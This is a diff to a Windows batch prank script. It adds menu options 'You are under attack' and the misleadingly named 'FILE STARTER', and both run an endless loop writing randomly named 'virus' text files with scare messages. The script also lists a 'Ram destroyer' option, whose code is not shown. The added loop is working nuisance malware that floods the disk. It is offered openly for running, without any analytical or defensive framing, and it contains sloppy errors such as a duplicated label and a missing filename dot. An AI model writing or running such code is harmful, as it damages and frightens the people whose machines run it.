@@ -12,12 +12,35 @@ echo This is my first coding experience where I used bassicly no help, I hope yo
 echo  1. Rick roll
 echo  2. Ram destroyer
 echo  3. Harmless matrix
+echo  4. You are under attack
+echo  5. FILE STARTER
 
 set /p hubchoice=
 if %hubchoice% == 1 goto rickroll
 if %hubchoice% == 2 goto ramdestroyer
 if %hubchoice% == 3 goto harmlessmatrix
+if %hubchoice% == 4 goto attack
+if %hubchoice% == 5 goto attack
 goto hub
+
+:attack
+
+echo off
+:start
+echo No escape >virus%random%txt
+
+goto start
+
+@echo off
+:start
+echo You're computer is under attack >virus%random%.txt
+echo You're computer is under attack >virus%random%.txt
+echo You're computer is under attack >virus%random%.txt
+echo You're computer is under attack >virus%random%.txt
+echo You're computer is under attack >virus%random%.txt
+echo You're computer is under attack >virus%random%.txt
+echo You're computer is under attack >virus%random%.txt
+
 
 :rickroll
 @echo off
@@ -46,8 +69,3 @@ echo 1 0 1 1 1 0 1 1 0 9 1 1 2 1 1 0 9 1 0 5 7 7 8 7 8 1 3 2 1 2 1 2 3 2 1 3 4
 ping localhost -n 1 > nul
 echo 1 1 1 0 1 0 0 1 0 0 0 1 1 1 0 0 1 1 1 4 1 2 1 1 2 0 1 0 1 2 2 1 0 1 1 0 1
 goto a
-
-
-
-
-
